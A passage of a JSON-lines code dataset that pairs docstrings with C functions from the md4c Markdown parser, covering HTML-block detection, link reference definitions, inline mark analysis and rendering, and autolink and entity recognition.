X(\"html\"), Xend };\n    static const TAG i6[] = { X(\"iframe\"), Xend };\n    static const TAG l6[] = { X(\"legend\"), X(\"li\"), X(\"link\"), Xend };\n    static const TAG m6[] = { X(\"main\"), X(\"menu\"), X(\"menuitem\"), Xend };\n    static const TAG n6[] = { X(\"nav\"), X(\"noframes\"), Xend };\n    static const TAG o6[] = { X(\"ol\"), X(\"optgroup\"), X(\"option\"), Xend };\n    static const TAG p6[] = { X(\"p\"), X(\"param\"), Xend };\n    static const TAG s6[] = { X(\"section\"), X(\"source\"), X(\"summary\"), Xend };\n    static const TAG t6[] = { X(\"table\"), X(\"tbody\"), X(\"td\"), X(\"tfoot\"), X(\"th\"),\n                              X(\"thead\"), X(\"title\"), X(\"tr\"), X(\"track\"), Xend };\n    static const TAG u6[] = { X(\"ul\"), Xend };\n    static const TAG xx[] = { Xend };\n#undef X\n\n    static const TAG* map6[26] = {\n        a6, b6, c6, d6, xx, f6, xx, h6, i6, xx, xx, l6, m6,\n        n6, o6, p6, xx, xx, s6, t6, u6, xx, xx, xx, xx, xx\n    };\n    OFF off = beg + 1;\n    int i;\n\n    /* Check for type 1: <script, <pre, or <style */\n    for(i = 0; t1[i].name != NULL; i++) {\n        if(off + t1[i].len <= ctx->size) {\n            if(md_ascii_case_eq(STR(off), t1[i].name, t1[i].len))\n                return 1;\n        }\n    }\n\n    /* Check for type 2: <!-- */\n    if(off + 3 < ctx->size  &&  CH(off) == _T('!')  &&  CH(off+1) == _T('-')  &&  CH(off+2) == _T('-'))\n        return 2;\n\n    /* Check for type 3: <? */\n    if(off < ctx->size  &&  CH(off) == _T('?'))\n        return 3;\n\n    /* Check for type 4 or 5: <! */\n    if(off < ctx->size  &&  CH(off) == _T('!')) {\n        /* Check for type 4: <! followed by uppercase letter. */\n        if(off + 1 < ctx->size  &&  ISUPPER(off+1))\n            return 4;\n\n        /* Check for type 5: <![CDATA[ */\n        if(off + 8 < ctx->size) {\n            if(md_ascii_eq(STR(off), _T(\"![CDATA[\"), 8))\n                return 5;\n        }\n    }\n\n    /* Check for type 6: Many possible starting tags listed above. */\n    if(off + 1 < ctx->size  &&  (ISALPHA(off) || (CH(off) == _T('/') && ISALPHA(off+1)))) {\n        int slot;\n        const TAG* tags;\n\n        if(CH(off) == _T('/'))\n            off++;\n\n        slot = (ISUPPER(off) ? CH(off) - 'A' : CH(off) - 'a');\n        tags = map6[slot];\n\n        for(i = 0; tags[i].name != NULL; i++) {\n            if(off + tags[i].len <= ctx->size) {\n                if(md_ascii_case_eq(STR(off), tags[i].name, tags[i].len)) {\n                    OFF tmp = off + tags[i].len;\n                    if(tmp >= ctx->size)\n                        return 6;\n                    if(ISBLANK(tmp) || ISNEWLINE(tmp) || CH(tmp) == _T('>'))\n                        return 6;\n                    if(tmp+1 < ctx->size && CH(tmp) == _T('/') && CH(tmp+1) == _T('>'))\n                        return 6;\n                    break;\n                }\n            }\n        }\n    }\n\n    /* Check for type 7: any COMPLETE other opening or closing tag. */\n    if(off + 1 < ctx->size) {\n        OFF end;\n\n        if(md_is_html_tag(ctx, NULL, 0, beg, ctx->size, &end)) {\n            /* Only optional whitespace and new line may follow. */\n            while(end < ctx->size  &&  ISWHITESPACE(end))\n                end++;\n            if(end >= ctx->size  ||  ISNEWLINE(end))\n                return 7;\n        }\n    }\n\n    return FALSE;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Analyze marks (build ctx->marks). */\n", "func_signal": "static int\nmd_analyze_inlines(MD_CTX* ctx, const MD_LINE* lines, int n_lines, int table_mode)", "code": "{\n    int ret;\n\n    /* Reset the previously collected stack of marks. */\n    ctx->n_marks = 0;\n\n    /* Collect all marks. */\n    MD_CHECK(md_collect_marks(ctx, lines, n_lines, table_mode));\n\n    /* We analyze marks in few groups to handle their precedence. */\n    /* (1) Entities; code spans; autolinks; raw HTML. */\n    md_analyze_marks(ctx, lines, n_lines, 0, ctx->n_marks, _T(\"&\"));\n\n    /* (2) Links. */\n    md_analyze_marks(ctx, lines, n_lines, 0, ctx->n_marks, _T(\"[]!\"));\n    MD_CHECK(md_resolve_links(ctx, lines, n_lines));\n    BRACKET_OPENERS.head = -1;\n    BRACKET_OPENERS.tail = -1;\n    ctx->unresolved_link_head = -1;\n    ctx->unresolved_link_tail = -1;\n\n    if(table_mode) {\n        /* (3) Analyze table cell boundaries.\n         * Note we reset TABLECELLBOUNDARIES chain prior to the call md_analyze_marks(),\n         * not after, because caller may need it. */\n        MD_ASSERT(n_lines == 1);\n        TABLECELLBOUNDARIES.head = -1;\n        TABLECELLBOUNDARIES.tail = -1;\n        ctx->n_table_cell_boundaries = 0;\n        md_analyze_marks(ctx, lines, n_lines, 0, ctx->n_marks, _T(\"|\"));\n        return ret;\n    }\n\n    /* (4) Emphasis and strong emphasis; permissive autolinks. */\n    md_analyze_link_contents(ctx, lines, n_lines, 0, ctx->n_marks);\n\nabort:\n    return ret;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Sometimes, we need to store a pointer into the mark. It is quite rare\n * so we do not bother to make MD_MARK use union, and it can only happen\n * for dummy marks. */\n", "func_signal": "static inline void\nmd_mark_store_ptr(MD_CTX* ctx, int mark_index, void* ptr)", "code": "{\n    MD_MARK* mark = &ctx->marks[mark_index];\n    MD_ASSERT(mark->ch == 'D');\n\n    /* Check only members beg and end are misused for this. */\n    MD_ASSERT(sizeof(void*) <= 2 * sizeof(OFF));\n    memcpy(mark, &ptr, sizeof(void*));\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* For permissive autolinks. */\n", "func_signal": "static MD_MARKCHAIN*\nmd_asterisk_chain(MD_CTX* ctx, unsigned flags)", "code": "{\n    switch(flags & (MD_MARK_EMPH_INTRAWORD | MD_MARK_EMPH_MOD3_MASK)) {\n        case MD_MARK_EMPH_INTRAWORD | MD_MARK_EMPH_MOD3_0:  return &ASTERISK_OPENERS_intraword_mod3_0;\n        case MD_MARK_EMPH_INTRAWORD | MD_MARK_EMPH_MOD3_1:  return &ASTERISK_OPENERS_intraword_mod3_1;\n        case MD_MARK_EMPH_INTRAWORD | MD_MARK_EMPH_MOD3_2:  return &ASTERISK_OPENERS_intraword_mod3_2;\n        case MD_MARK_EMPH_MOD3_0:                           return &ASTERISK_OPENERS_extraword_mod3_0;\n        case MD_MARK_EMPH_MOD3_1:                           return &ASTERISK_OPENERS_extraword_mod3_1;\n        case MD_MARK_EMPH_MOD3_2:                           return &ASTERISK_OPENERS_extraword_mod3_2;\n        default:                                            MD_UNREACHABLE();\n    }\n    return NULL;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Eat from start of current (textual) block any reference definitions and\n * remember them so we can resolve any links referring to them.\n *\n * (Reference definitions can only be at start of it as they cannot break\n * a paragraph.)\n */\n", "func_signal": "static int\nmd_consume_link_reference_definitions(MD_CTX* ctx)", "code": "{\n    MD_LINE* lines = (MD_LINE*) (ctx->current_block + 1);\n    int n_lines = ctx->current_block->n_lines;\n    int n = 0;\n\n    /* Compute how many lines at the start of the block form one or more\n     * reference definitions. */\n    while(n < n_lines) {\n        int n_link_ref_lines;\n\n        n_link_ref_lines = md_is_link_reference_definition(ctx,\n                                    lines + n, n_lines - n);\n        /* Not a reference definition? */\n        if(n_link_ref_lines == 0)\n            break;\n\n        /* We fail if it is the ref. def. but it could not be stored due\n         * a memory allocation error. */\n        if(n_link_ref_lines < 0)\n            return -1;\n\n        n += n_link_ref_lines;\n    }\n\n    /* If there was at least one reference definition, we need to remove\n     * its lines from the block, or perhaps even the whole block. */\n    if(n > 0) {\n        if(n == n_lines) {\n            /* Remove complete block. */\n            ctx->n_block_bytes -= n * sizeof(MD_LINE);\n            ctx->n_block_bytes -= sizeof(MD_BLOCK);\n            ctx->current_block = NULL;\n        } else {\n            /* Remove just some initial lines from the block. */\n            memmove(lines, lines + n, (n_lines - n) * sizeof(MD_LINE));\n            ctx->current_block->n_lines -= n;\n            ctx->n_block_bytes -= n * sizeof(MD_LINE);\n        }\n    }\n\n    return 0;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Returns 0 if it is not a reference definition.\n *\n * Returns N > 0 if it is a reference definition. N then corresponds to the\n * number of lines forming it). In this case the definition is stored for\n * resolving any links referring to it.\n *\n * Returns -1 in case of an error (out of memory).\n */\n", "func_signal": "static int\nmd_is_link_reference_definition(MD_CTX* ctx, const MD_LINE* lines, int n_lines)", "code": "{\n    OFF label_contents_beg;\n    OFF label_contents_end;\n    int label_contents_line_index = -1;\n    int label_is_multiline = FALSE;\n    OFF dest_contents_beg;\n    OFF dest_contents_end;\n    OFF title_contents_beg;\n    OFF title_contents_end;\n    int title_contents_line_index;\n    int title_is_multiline = FALSE;\n    OFF off;\n    int line_index = 0;\n    int tmp_line_index;\n    MD_REF_DEF* def = NULL;\n    int ret = 0;\n\n    /* Link label. */\n    if(!md_is_link_label(ctx, lines, n_lines, lines[0].beg,\n                &off, &label_contents_line_index, &line_index,\n                &label_contents_beg, &label_contents_end))\n        return FALSE;\n    label_is_multiline = (label_contents_line_index != line_index);\n\n    /* Colon. */\n    if(off >= lines[line_index].end  ||  CH(off) != _T(':'))\n        return FALSE;\n    off++;\n\n    /* Optional white space with up to one line break. */\n    while(off < lines[line_index].end  &&  ISWHITESPACE(off))\n        off++;\n    if(off >= lines[line_index].end) {\n        line_index++;\n        if(line_index >= n_lines)\n            return FALSE;\n        off = lines[line_index].beg;\n    }\n\n    /* Link destination. */\n    if(!md_is_link_destination(ctx, off, lines[line_index].end,\n                &off, &dest_contents_beg, &dest_contents_end))\n        return FALSE;\n\n    /* (Optional) title. Note we interpret it as an title only if nothing\n     * more follows on its last line. */\n    if(md_is_link_title(ctx, lines + line_index, n_lines - line_index, off,\n                &off, &title_contents_line_index, &tmp_line_index,\n                &title_contents_beg, &title_contents_end)\n        &&  off >= lines[line_index + tmp_line_index].end)\n    {\n        title_is_multiline = (tmp_line_index != title_contents_line_index);\n        title_contents_line_index += line_index;\n        line_index += tmp_line_index;\n    } else {\n        /* Not a title. */\n        title_is_multiline = FALSE;\n        title_contents_beg = off;\n        title_contents_end = off;\n        title_contents_line_index = 0;\n    }\n\n    /* Nothing more can follow on the last line. */\n    if(off < lines[line_index].end)\n        return FALSE;\n\n    /* So, it _is_ a reference definition. Remember it. */\n    if(ctx->n_ref_defs >= ctx->alloc_ref_defs) {\n        MD_REF_DEF* new_defs;\n\n        ctx->alloc_ref_defs = (ctx->alloc_ref_defs > 0\n                ? ctx->alloc_ref_defs + ctx->alloc_ref_defs / 2\n                : 16);\n        new_defs = (MD_REF_DEF*) realloc(ctx->ref_defs, ctx->alloc_ref_defs * sizeof(MD_REF_DEF));\n        if(new_defs == NULL) {\n            MD_LOG(\"realloc() failed.\");\n            goto abort;\n        }\n\n        ctx->ref_defs = new_defs;\n    }\n    def = &ctx->ref_defs[ctx->n_ref_defs];\n    memset(def, 0, sizeof(MD_REF_DEF));\n\n    if(label_is_multiline) {\n        MD_CHECK(md_merge_lines_alloc(ctx, label_contents_beg, label_contents_end,\n                    lines + label_contents_line_index, n_lines - label_contents_line_index,\n                    _T(' '), &def->label, &def->label_size));\n        def->label_needs_free = TRUE;\n    } else {\n        def->label = (CHAR*) STR(label_contents_beg);\n        def->label_size = label_contents_end - label_contents_beg;\n    }\n\n    if(title_is_multiline) {\n        MD_CHECK(md_merge_lines_alloc(ctx, title_contents_beg, title_contents_end,\n                    lines + title_contents_line_index, n_lines - title_contents_line_index,\n                    _T('\\n'), &def->title, &def->title_size));\n        def->title_needs_free = TRUE;\n    } else {\n        def->title = (CHAR*) STR(title_contents_beg);\n        def->title_size = title_contents_end - title_contents_beg;\n    }\n\n    def->dest_beg = dest_contents_beg;\n    def->dest_end = dest_contents_end;\n\n    /* Success. */\n    ctx->n_ref_defs++;\n    return line_index + 1;\n\nabort:\n    /* Failure. */\n    if(def != NULL  &&  def->label_needs_free)\n        free(def->label);\n    if(def != NULL  &&  def->title_needs_free)\n        free(def->title);\n    return ret;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Render the output, accordingly to the analyzed ctx->marks. */\n", "func_signal": "static int\nmd_process_inlines(MD_CTX* ctx, const MD_LINE* lines, int n_lines)", "code": "{\n    MD_TEXTTYPE text_type;\n    const MD_LINE* line = lines;\n    MD_MARK* prev_mark = NULL;\n    MD_MARK* mark;\n    OFF off = lines[0].beg;\n    OFF end = lines[n_lines-1].end;\n    int enforce_hardbreak = 0;\n    int ret = 0;\n\n    /* Find first resolved mark. Note there is always at least one resolved\n     * mark,  the dummy last one after the end of the latest line we actually\n     * never really reach. This saves us of a lot of special checks and cases\n     * in this function. */\n    mark = ctx->marks;\n    while(!(mark->flags & MD_MARK_RESOLVED))\n        mark++;\n\n    text_type = MD_TEXT_NORMAL;\n\n    while(1) {\n        /* Process the text up to the next mark or end-of-line. */\n        OFF tmp = (line->end < mark->beg ? line->end : mark->beg);\n        if(tmp > off) {\n            MD_TEXT(text_type, STR(off), tmp - off);\n            off = tmp;\n        }\n\n        /* If reached the mark, process it and move to next one. */\n        if(off >= mark->beg) {\n            switch(mark->ch) {\n                case '\\\\':      /* Backslash escape. */\n                    if(ISNEWLINE(mark->beg+1))\n                        enforce_hardbreak = 1;\n                    else\n                        MD_TEXT(text_type, STR(mark->beg+1), 1);\n                    break;\n\n                case ' ':       /* Non-trivial space. */\n                    MD_TEXT(text_type, _T(\" \"), 1);\n                    break;\n\n                case '`':       /* Code span. */\n                    if(mark->flags & MD_MARK_OPENER) {\n                        MD_ENTER_SPAN(MD_SPAN_CODE, NULL);\n                        text_type = MD_TEXT_CODE;\n                    } else {\n                        MD_LEAVE_SPAN(MD_SPAN_CODE, NULL);\n                        text_type = MD_TEXT_NORMAL;\n                    }\n                    break;\n\n                case '_':       /* Underline (or emphasis if we fall through). */\n                    if(ctx->parser.flags & MD_FLAG_UNDERLINE) {\n                        if(mark->flags & MD_MARK_OPENER) {\n                            while(off < mark->end) {\n                                MD_ENTER_SPAN(MD_SPAN_U, NULL);\n                                off++;\n                            }\n                        } else {\n                            while(off < mark->end) {\n                                MD_LEAVE_SPAN(MD_SPAN_U, NULL);\n                                off++;\n                            }\n                        }\n                        break;\n                    }\n                    MD_FALLTHROUGH();\n\n                case '*':       /* Emphasis, strong emphasis. */\n                    if(mark->flags & MD_MARK_OPENER) {\n                        if((mark->end - off) % 2) {\n                            MD_ENTER_SPAN(MD_SPAN_EM, NULL);\n                            off++;\n                        }\n                        while(off + 1 < mark->end) {\n                            MD_ENTER_SPAN(MD_SPAN_STRONG, NULL);\n                            off += 2;\n                        }\n                    } else {\n                        while(off + 1 < mark->end) {\n                            MD_LEAVE_SPAN(MD_SPAN_STRONG, NULL);\n                            off += 2;\n                        }\n                        if((mark->end - off) % 2) {\n                            MD_LEAVE_SPAN(MD_SPAN_EM, NULL);\n                            off++;\n                        }\n                    }\n                    break;\n\n                case '~':\n                    if(mark->flags & MD_MARK_OPENER)\n                        MD_ENTER_SPAN(MD_SPAN_DEL, NULL);\n                    else\n                        MD_LEAVE_SPAN(MD_SPAN_DEL, NULL);\n                    break;\n\n                case '$':\n                    if(mark->flags & MD_MARK_OPENER) {\n                        MD_ENTER_SPAN((mark->end - off) % 2 ? MD_SPAN_LATEXMATH : MD_SPAN_LATEXMATH_DISPLAY, NULL);\n                        text_type = MD_TEXT_LATEXMATH;\n                    } else {\n                        MD_LEAVE_SPAN((mark->end - off) % 2 ? MD_SPAN_LATEXMATH : MD_SPAN_LATEXMATH_DISPLAY, NULL);\n                        text_type = MD_TEXT_NORMAL;\n                    }\n                    break;\n\n                case '[':       /* Link, wiki link, image. */\n                case '!':\n                case ']':\n                {\n                    const MD_MARK* opener = (mark->ch != ']' ? mark : &ctx->marks[mark->prev]);\n                    const MD_MARK* closer = &ctx->marks[opener->next];\n                    const MD_MARK* dest_mark;\n                    const MD_MARK* title_mark;\n\n                    if ((opener->ch == '[' && closer->ch == ']') &&\n                        opener->end - opener->beg >= 2 &&\n                        closer->end - closer->beg >= 2)\n                    {\n                        int has_label = (opener->end - opener->beg > 2);\n                        SZ target_sz;\n\n                        if(has_label)\n                            target_sz = opener->end - (opener->beg+2);\n                        else\n                            target_sz = closer->beg - opener->end;\n\n                        MD_CHECK(md_enter_leave_span_wikilink(ctx, (mark->ch != ']'),\n                                 has_label ? STR(opener->beg+2) : STR(opener->end),\n                                 target_sz));\n\n                        break;\n                    }\n\n                    dest_mark = opener+1;\n                    MD_ASSERT(dest_mark->ch == 'D');\n                    title_mark = opener+2;\n                    MD_ASSERT(title_mark->ch == 'D');\n\n                    MD_CHECK(md_enter_leave_span_a(ctx, (mark->ch != ']'),\n                                (opener->ch == '!' ? MD_SPAN_IMG : MD_SPAN_A),\n                                STR(dest_mark->beg), dest_mark->end - dest_mark->beg, FALSE,\n                                md_mark_get_ptr(ctx, title_mark - ctx->marks), title_mark->prev));\n\n                    /* link/image closer may span multiple lines. */\n                    if(mark->ch == ']') {\n                        while(mark->end > line->end)\n                            line++;\n                    }\n\n                    break;\n                }\n\n                case '<':\n                case '>':       /* Autolink or raw HTML. */\n                    if(!(mark->flags & MD_MARK_AUTOLINK)) {\n                        /* Raw HTML. */\n                        if(mark->flags & MD_MARK_OPENER)\n                            text_type = MD_TEXT_HTML;\n                        else\n                            text_type = MD_TEXT_NORMAL;\n                        break;\n                    }\n                    /* Pass through, if auto-link. */\n                    MD_FALLTHROUGH();\n\n                case '@':       /* Permissive e-mail autolink. */\n                case ':':       /* Permissive URL autolink. */\n                case '.':       /* Permissive WWW autolink. */\n                {\n                    MD_MARK* opener = ((mark->flags & MD_MARK_OPENER) ? mark : &ctx->marks[mark->prev]);\n                    MD_MARK* closer = &ctx->marks[opener->next];\n                    const CHAR* dest = STR(opener->end);\n                    SZ dest_size = closer->beg - opener->end;\n\n                    /* For permissive auto-links we do not know closer mark\n                     * position at the time of md_collect_marks(), therefore\n                     * it can be out-of-order in ctx->marks[].\n                     *\n                     * With this flag, we make sure that we output the closer\n                     * only if we processed the opener. */\n                    if(mark->flags & MD_MARK_OPENER)\n                        closer->flags |= MD_MARK_VALIDPERMISSIVEAUTOLINK;\n\n                    if(opener->ch == '@' || opener->ch == '.') {\n                        dest_size += 7;\n                        MD_TEMP_BUFFER(dest_size * sizeof(CHAR));\n                        memcpy(ctx->buffer,\n                                (opener->ch == '@' ? _T(\"mailto:\") : _T(\"http://\")),\n                                7 * sizeof(CHAR));\n                        memcpy(ctx->buffer + 7, dest, (dest_size-7) * sizeof(CHAR));\n                        dest = ctx->buffer;\n                    }\n\n                    if(closer->flags & MD_MARK_VALIDPERMISSIVEAUTOLINK)\n                        MD_CHECK(md_enter_leave_span_a(ctx, (mark->flags & MD_MARK_OPENER),\n                                    MD_SPAN_A, dest, dest_size, TRUE, NULL, 0));\n                    break;\n                }\n\n                case '&':       /* Entity. */\n                    MD_TEXT(MD_TEXT_ENTITY, STR(mark->beg), mark->end - mark->beg);\n                    break;\n\n                case '\\0':\n                    MD_TEXT(MD_TEXT_NULLCHAR, _T(\"\"), 1);\n                    break;\n\n                case 127:\n                    goto abort;\n            }\n\n            off = mark->end;\n\n            /* Move to next resolved mark. */\n            prev_mark = mark;\n            mark++;\n            while(!(mark->flags & MD_MARK_RESOLVED)  ||  mark->beg < off)\n                mark++;\n        }\n\n        /* If reached end of line, move to next one. */\n        if(off >= line->end) {\n            /* If it is the last line, we are done. */\n            if(off >= end)\n                break;\n\n            if(text_type == MD_TEXT_CODE || text_type == MD_TEXT_LATEXMATH) {\n                OFF tmp;\n\n                MD_ASSERT(prev_mark != NULL);\n                MD_ASSERT(ISANYOF2_(prev_mark->ch, '`', '$')  &&  (prev_mark->flags & MD_MARK_OPENER));\n                MD_ASSERT(ISANYOF2_(mark->ch, '`', '$')  &&  (mark->flags & MD_MARK_CLOSER));\n\n                /* Inside a code span, trailing line whitespace has to be\n                 * outputted. */\n                tmp = off;\n                while(off < ctx->size  &&  ISBLANK(off))\n                    off++;\n                if(off > tmp)\n                    MD_TEXT(text_type, STR(tmp), off-tmp);\n\n                /* and new lines are transformed into single spaces. */\n                if(prev_mark->end < off  &&  off < mark->beg)\n                    MD_TEXT(text_type, _T(\" \"), 1);\n            } else if(text_type == MD_TEXT_HTML) {\n                /* Inside raw HTML, we output the new line verbatim, including\n                 * any trailing spaces. */\n                OFF tmp = off;\n\n                while(tmp < end  &&  ISBLANK(tmp))\n                    tmp++;\n                if(tmp > off)\n                    MD_TEXT(MD_TEXT_HTML, STR(off), tmp - off);\n                MD_TEXT(MD_TEXT_HTML, _T(\"\\n\"), 1);\n            } else {\n                /* Output soft or hard line break. */\n                MD_TEXTTYPE break_type = MD_TEXT_SOFTBR;\n\n                if(text_type == MD_TEXT_NORMAL) {\n                    if(enforce_hardbreak)\n                        break_type = MD_TEXT_BR;\n                    else if((CH(line->end) == _T(' ') && CH(line->end+1) == _T(' ')))\n                        break_type = MD_TEXT_BR;\n                }\n\n                MD_TEXT(break_type, _T(\"\\n\"), 1);\n            }\n\n            /* Move to the next line. */\n            line++;\n            off = line->beg;\n\n            enforce_hardbreak = 0;\n        }\n    }\n\nabort:\n    return ret;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Analyze whether the mark '&' starts a HTML entity.\n * If so, update its flags as well as flags of corresponding closer ';'. */\n", "func_signal": "static void\nmd_analyze_entity(MD_CTX* ctx, int mark_index)", "code": "{\n    MD_MARK* opener = &ctx->marks[mark_index];\n    MD_MARK* closer;\n    OFF off;\n\n    /* Cannot be entity if there is no closer as the next mark.\n     * (Any other mark between would mean strange character which cannot be\n     * part of the entity.\n     *\n     * So we can do all the work on '&' and do not call this later for the\n     * closing mark ';'.\n     */\n    if(mark_index + 1 >= ctx->n_marks)\n        return;\n    closer = &ctx->marks[mark_index+1];\n    if(closer->ch != ';')\n        return;\n\n    if(md_is_entity(ctx, opener->beg, closer->end, &off)) {\n        MD_ASSERT(off == closer->end);\n\n        md_resolve_range(ctx, NULL, mark_index, mark_index+1);\n        opener->end = closer->end;\n    }\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* In the range ctx->marks[opener_index] ... [closer_index], undo some or all\n * resolvings accordingly to these rules:\n *\n * (1) All openers BEFORE the range corresponding to any closer inside the\n *     range are un-resolved and they are re-added to their respective chains\n *     of unresolved openers. This ensures we can reuse the opener for closers\n *     AFTER the range.\n *\n * (2) If 'how' is MD_ROLLBACK_ALL, then ALL resolved marks inside the range\n *     are discarded.\n *\n * (3) If 'how' is MD_ROLLBACK_CROSSING, only closers with openers handled\n *     in (1) are discarded. I.e. pairs of openers and closers which are both\n *     inside the range are retained as well as any unpaired marks.\n */\n", "func_signal": "static void\nmd_rollback(MD_CTX* ctx, int opener_index, int closer_index, int how)", "code": "{\n    int i;\n    int mark_index;\n\n    /* Cut all unresolved openers at the mark index. */\n    for(i = OPENERS_CHAIN_FIRST; i < OPENERS_CHAIN_LAST+1; i++) {\n        MD_MARKCHAIN* chain = &ctx->mark_chains[i];\n\n        while(chain->tail >= opener_index)\n            chain->tail = ctx->marks[chain->tail].prev;\n\n        if(chain->tail >= 0)\n            ctx->marks[chain->tail].next = -1;\n        else\n            chain->head = -1;\n    }\n\n    /* Go backwards so that unresolved openers are re-added into their\n     * respective chains, in the right order. */\n    mark_index = closer_index - 1;\n    while(mark_index > opener_index) {\n        MD_MARK* mark = &ctx->marks[mark_index];\n        int mark_flags = mark->flags;\n        int discard_flag = (how == MD_ROLLBACK_ALL);\n\n        if(mark->flags & MD_MARK_CLOSER) {\n            int mark_opener_index = mark->prev;\n\n            /* Undo opener BEFORE the range. */\n            if(mark_opener_index < opener_index) {\n                MD_MARK* mark_opener = &ctx->marks[mark_opener_index];\n                MD_MARKCHAIN* chain;\n\n                mark_opener->flags &= ~(MD_MARK_OPENER | MD_MARK_CLOSER | MD_MARK_RESOLVED);\n                chain = md_mark_chain(ctx, opener_index);\n                if(chain != NULL) {\n                    md_mark_chain_append(ctx, chain, mark_opener_index);\n                    discard_flag = 1;\n                }\n            }\n        }\n\n        /* And reset our flags. */\n        if(discard_flag)\n            mark->flags &= ~(MD_MARK_OPENER | MD_MARK_CLOSER | MD_MARK_RESOLVED);\n\n        /* Jump as far as we can over unresolved or non-interesting marks. */\n        switch(how) {\n            case MD_ROLLBACK_CROSSING:\n                if((mark_flags & MD_MARK_CLOSER)  &&  mark->prev > opener_index) {\n                    /* If we are closer with opener INSIDE the range, there may\n                     * not be any other crosser inside the subrange. */\n                    mark_index = mark->prev;\n                    break;\n                }\n                MD_FALLTHROUGH();\n            default:\n                mark_index--;\n                break;\n        }\n    }\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/************************************\n ***  Grouping Lines into Blocks  ***\n ************************************/\n", "func_signal": "static void*\nmd_push_block_bytes(MD_CTX* ctx, int n_bytes)", "code": "{\n    void* ptr;\n\n    if(ctx->n_block_bytes + n_bytes > ctx->alloc_block_bytes) {\n        void* new_block_bytes;\n\n        ctx->alloc_block_bytes = (ctx->alloc_block_bytes > 0\n                ? ctx->alloc_block_bytes + ctx->alloc_block_bytes / 2\n                : 512);\n        new_block_bytes = realloc(ctx->block_bytes, ctx->alloc_block_bytes);\n        if(new_block_bytes == NULL) {\n            MD_LOG(\"realloc() failed.\");\n            return NULL;\n        }\n\n        /* Fix the ->current_block after the reallocation. */\n        if(ctx->current_block != NULL) {\n            OFF off_current_block = (char*) ctx->current_block - (char*) ctx->block_bytes;\n            ctx->current_block = (MD_BLOCK*) ((char*) new_block_bytes + off_current_block);\n        }\n\n        ctx->block_bytes = new_block_bytes;\n    }\n\n    ptr = (char*)ctx->block_bytes + ctx->n_block_bytes;\n    ctx->n_block_bytes += n_bytes;\n    return ptr;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* Case insensitive check of string equality. */\n", "func_signal": "static inline int\nmd_ascii_case_eq(const CHAR* s1, const CHAR* s2, SZ n)", "code": "{\n    OFF i;\n    for(i = 0; i < n; i++) {\n        CHAR ch1 = s1[i];\n        CHAR ch2 = s2[i];\n\n        if(ISLOWER_(ch1))\n            ch1 += ('A'-'a');\n        if(ISLOWER_(ch2))\n            ch2 += ('A'-'a');\n        if(ch1 != ch2)\n            return FALSE;\n    }\n    return TRUE;\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/* The permissive autolinks do not have to be enclosed in '<' '>' but we\n * instead impose stricter rules what is understood as an e-mail address\n * here. Actually any non-alphanumeric characters with exception of '.'\n * are prohibited both in username and after '@'. */\n", "func_signal": "static void\nmd_analyze_permissive_email_autolink(MD_CTX* ctx, int mark_index)", "code": "{\n    MD_MARK* opener = &ctx->marks[mark_index];\n    int closer_index;\n    MD_MARK* closer;\n    OFF beg = opener->beg;\n    OFF end = opener->end;\n    int dot_count = 0;\n\n    MD_ASSERT(CH(beg) == _T('@'));\n\n    /* Scan for name before '@'. */\n    while(beg > 0  &&  (ISALNUM(beg-1) || ISANYOF(beg-1, _T(\".-_+\"))))\n        beg--;\n\n    /* Scan for domain after '@'. */\n    while(end < ctx->size  &&  (ISALNUM(end) || ISANYOF(end, _T(\".-_\")))) {\n        if(CH(end) == _T('.'))\n            dot_count++;\n        end++;\n    }\n    if(CH(end-1) == _T('.')) {  /* Final '.' not part of it. */\n        dot_count--;\n        end--;\n    }\n    else if(ISANYOF2(end-1, _T('-'), _T('_'))) /* These are forbidden at the end. */\n        return;\n    if(CH(end-1) == _T('@')  ||  dot_count == 0)\n        return;\n\n    /* Ok. Lets call it auto-link. Adapt opener and create closer to zero\n     * length so all the contents becomes the link text. */\n    closer_index = mark_index + 1;\n    closer = &ctx->marks[closer_index];\n    MD_ASSERT(closer->ch == 'D');\n\n    opener->beg = beg;\n    opener->end = beg;\n    closer->ch = opener->ch;\n    closer->beg = end;\n    closer->end = end;\n    md_resolve_range(ctx, NULL, mark_index, closer_index);\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
{"docstring": "/****************************\n ***  Recognizing Entity  ***\n ****************************/\n", "func_signal": "static int\nmd_is_hex_entity_contents(MD_CTX* ctx, const CHAR* text, OFF beg, OFF max_end, OFF* p_end)", "code": "{\n    OFF off = beg;\n    MD_UNUSED(ctx);\n\n    while(off < max_end  &&  ISXDIGIT_(text[off])  &&  off - beg <= 8)\n        off++;\n\n    if(1 <= off - beg  &&  off - beg <= 6) {\n        *p_end = off;\n        return TRUE;\n    } else {\n        return FALSE;\n    }\n}", "path": "tools\\specgen\\md4c.c", "repo_name": "playbit/playsys", "stars": 275, "license": "apache-2.0", "language": "c", "size": 308}
